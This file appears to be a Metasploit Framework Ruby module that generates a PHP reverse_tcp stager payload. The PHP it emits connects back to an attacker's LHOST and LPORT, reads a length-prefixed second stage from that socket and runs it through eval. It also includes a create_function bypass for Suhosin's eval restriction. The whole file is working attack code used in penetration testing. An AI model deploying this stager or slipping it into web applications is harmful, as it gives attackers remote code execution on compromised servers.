
# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/php/send_uuid'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex reverse_tcp payload generation for PHP
#
###

module Payload::Php::ReverseTcp

  include Msf::Payload::Php::SendUUID
  include Msf::Payload::UUID::Options

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
    }

    php = super + generate_reverse_tcp(conf)
    php.gsub!(/#.*$/, '')
    Rex::Text.compress(php)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_reverse_tcp(opts={})
    ipf = "AF_INET";
    if Rex::Socket.is_ipv6?(opts[:host])
      ipf << "6"
      opts[:host] = "[#{opts[:host]}]"
    end

    php = %Q^/*<?php /**/
error_reporting(0);
$ip = '#{opts[:host]}';
$port = #{opts[:port]};

if (($f = 'stream_socket_client') && is_callable($f)) {
	$s = $f("tcp://{$ip}:{$port}");
	$s_type = 'stream';
}
if (!$s && ($f = 'fsockopen') && is_callable($f)) {
	$s = $f($ip, $port);
	$s_type = 'stream';
}
if (!$s && ($f = 'socket_create') && is_callable($f)) {
	$s = $f(#{ipf}, SOCK_STREAM, SOL_TCP);
	$res = @socket_connect($s, $ip, $port);
	if (!$res) { die(); }
	$s_type = 'socket';
}
if (!$s_type) {
	die('no socket funcs');
}
if (!$s) { die('no socket'); }
^

    php << php_send_uuid if include_send_uuid

    php << %Q^switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) {
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) 
{ 
  $suhosin_bypass=create_function('', $b); 
  $suhosin_bypass(); 
} 
else 
{ 
  eval($b); 
}
die();^
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end

